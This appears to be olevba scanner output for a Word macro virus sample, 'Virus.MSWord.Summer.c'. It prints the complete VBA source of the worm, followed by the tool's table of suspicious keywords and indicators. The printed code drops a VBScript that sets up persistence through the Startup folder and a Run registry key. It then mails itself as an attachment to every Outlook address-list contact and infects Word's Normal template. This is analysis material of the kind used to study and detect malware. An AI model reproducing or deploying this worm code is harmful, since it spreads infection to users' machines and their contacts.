olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Summer.c-db3603f6bdadf66c7a12dae818ea571dbf8e51dc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SummerCity.cls 
in file: Virus.MSWord.Summer.c-db3603f6bdadf66c7a12dae818ea571dbf8e51dc - OLE stream: 'Macros/VBA/SummerCity'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AutoClose()


Dim sStr As String

sStr = ""

sStr = sStr + "' Summer" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "On Error Resume Next" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "Dim A02" + vbCrLf
sStr = sStr + "Dim A06" + vbCrLf
sStr = sStr + "Dim A07" + vbCrLf
sStr = sStr + "Dim A05" + vbCrLf
sStr = sStr + "Dim A09" + vbCrLf
sStr = sStr + "Dim A10" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "sRun = §\Software\Microsoft\Windows\CurrentVersion\Run§" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "' AutoStart upon boot by adding to Startup directory" + vbCrLf
sStr = sStr + "sDirStart = fso.BuildPath(shell.SpecialFolders(§Startup§), §summmer.vbs§)" + vbCrLf
sStr = sStr + "fso.CopyFile WScript.ScriptFullName, sDirStart" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "CreateObject( §Scripting.FileSystemObject§ ).CopyFile WScript.ScriptFullName, CreateObject( §Scripting.FileSystemObject§ ).BuildPath( CreateObject( §Scripting.FileSystemObject§ ).GetSpecialFolder(1), §Summer.vbs§ )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "CreateObject( §WScript.Shell§ ).RegWrite §HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\§ & §Summer§, CreateObject( §Scripting.FileSystemObject§ ).BuildPath( CreateObject( §Scripting.FileSystemObject§ ).GetSpecialFolder(1), §Summer.vbs§ )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "A04 = CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "If CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) = §§ Or CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) > 20 Then" + vbCrLf
sStr = sStr + "   CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) = 0" + vbCrLf
sStr = sStr + "End If" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "If CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) = 0 Then" + vbCrLf
sStr = sStr + "   Set A05 = CreateObject( §Outlook.Application§ )" + vbCrLf
sStr = sStr + "   Set A06 = A05.GetNameSpace( §MAPI§ )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "   For Each A07 In A06.AddressLists" + vbCrLf
sStr = sStr + "       Set A08 = A05.CreateItem( 0 )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "       For A09 = 1 To A07.AddressEntries.Count" + vbCrLf
sStr = sStr + "           Set A10 = A07.AddressEntries( A09 )" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "           If A09 = 1 Then" + vbCrLf
sStr = sStr + "              A08.BCC = A10.Address" + vbCrLf
sStr = sStr + "           Else" + vbCrLf
sStr = sStr + "              A08.BCC = A08.BCC & §; § & A10.Address" + vbCrLf
sStr = sStr + "           End If" + vbCrLf
sStr = sStr + "       Next" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "       A08.Subject = §Hottest Summer News§" + vbCrLf
sStr = sStr + "       A08.Body = §Go to the beach and have fun§" + vbCrLf
sStr = sStr + "       A08.Attachments.Add WScript.ScriptFullName" + vbCrLf
sStr = sStr + "       A08.DeleteAfterSubmit = True" + vbCrLf
sStr = sStr + "       A08.Send" + vbCrLf
sStr = sStr + "   Next" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "   CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) = 0" + vbCrLf
sStr = sStr + "End If" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "CreateObject( §WScript.Shell§ ).RegWrite §HKEY_LOCAL_MACHINE\§ & §Summer§, CreateObject( §WScript.Shell§ ).RegRead( §HKEY_LOCAL_MACHINE\§ & §Summer§ ) + 1" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "' =-=-=-=-=-=-  Dropper Code to infect MS Word  =-=-=-=-=-=-" + vbCrLf
sStr = sStr + "sHeader = §Private Sub AutoClose()§+vbCRLF+vbCRLF+vbCRLF+§Dim sStr As String§+vbCRLF+vbCRLF+§sStr = §+Chr(34)+Chr(34)+vbCRLF" + vbCrLf
sStr = sStr + "sFooter =§Dim sFind As Long§+vbCRLF+vbCRLF+§idx = 1§+vbCRLF+§sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)§+vbCRLF+§While sFind§+vbCRLF+§  Mid(sStr, sFind, 1) = Chr(34)§+vbCRLF+§  sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)§+vbCRLF+§Wend§+vbCRLF+vbCRLF+§Set fso = CreateObject(§+Chr(34)+§Scripting.FileSystemObject§+Chr(34)+§)§+vbCRLF+§Set Script = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), §+Chr(34)+§export.vbs§+Chr(34)+§), True)§+vbCRLF+§Script.Write sStr§+vbCRLF+§Script.Close§+vbCRLF+§winFolder = Environ(§+Chr(34)+§WINDIR§+Chr(34)+§)§+vbCRLF+§'Shell winFolder + §+Chr(34)+§\export.vbs§+Chr(34)+§, 0§+vbCRLF+vbCRLF+§End Sub§+vbCRLF" + vbCrLf
sStr = sStr + "' Read our code in" + vbCrLf
sStr = sStr + "Set fso = CreateObject(§Scripting.FileSystemObject§)" + vbCrLf
sStr = sStr + "Set f = fso.OpenTextFile(Wscript.ScriptFullName, 1)" + vbCrLf
sStr = sStr + "WordVirus = f.Readall()" + vbCrLf
sStr = sStr + "f.Close" + vbCrLf
sStr = sStr + "' Replace any quotes" + vbCrLf
sStr = sStr + "WordVirus = Replace(WordVirus, Chr(34), Chr(167))" + vbCrLf
sStr = sStr + "lines = Split(WordVirus, vbCRLF)" + vbCrLf
sStr = sStr + "For n = 0 to Ubound(lines)" + vbCrLf
sStr = sStr + "  lines(n) = §sStr=sStr+§ & Chr(34) & lines(n) & Chr(34) & §+vbCRLF§" + vbCrLf
sStr = sStr + "Next" + vbCrLf
sStr = sStr + "' Get Word's Normal Template" + vbCrLf
sStr = sStr + "Set WordObj = GetObject(§§,§Word.Application§)" + vbCrLf
sStr = sStr + "If WordObj = §§ Then Set WordObj = CreateObject(§Word.Application§)" + vbCrLf
sStr = sStr + "WordObj.Visible = True" + vbCrLf
sStr = sStr + "WordObj.Activate" + vbCrLf
sStr = sStr + "WordObj.Options.SaveNormalPrompt = False" + vbCrLf
sStr = sStr + "Set NTI1 = WordObj.NormalTemplate.VBProject.VBComponents.Item(1)" + vbCrLf
sStr = sStr + "' Infect Normal Template" + vbCrLf
sStr = sStr + "If NTI1.Name <> §SummerCity§ Then" + vbCrLf
sStr = sStr + "  NTI1.CodeModule.DeleteLines 1, NTI1.CodeModule.CountOfLines" + vbCrLf
sStr = sStr + "  NTI1.CodeModule.InsertLines 1, sFooter" + vbCrLf
sStr = sStr + "  NTI1.CodeModule.InsertLines 1, Join(lines, vbCRLF)" + vbCrLf
sStr = sStr + "  NTI1.CodeModule.InsertLines 1, sHeader" + vbCrLf
sStr = sStr + "  NTI1.Name = §SummerCity§" + vbCrLf
sStr = sStr + "End If" + vbCrLf
sStr = sStr + "' Clean up" + vbCrLf
sStr = sStr + "set NTI1 = Nothing" + vbCrLf
sStr = sStr + "set WordObj = Nothing" + vbCrLf
sStr = sStr + "" + vbCrLf
sStr = sStr + "" + vbCrLf
Dim sFind As Long

idx = 1
sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)
While sFind
  Mid(sStr, sFind, 1) = Chr(34)
  sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)
Wend

Set fso = CreateObject("Scripting.FileSystemObject")
Set Script = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), "export.vbs"), True)
Script.Write sStr
Script.Close
winFolder = Environ("WINDIR")
'Shell winFolder + "\export.vbs", 0

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |summmer.vbs         |Executable file name                         |
|IOC       |Summer.vbs          |Executable file name                         |
|IOC       |export.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

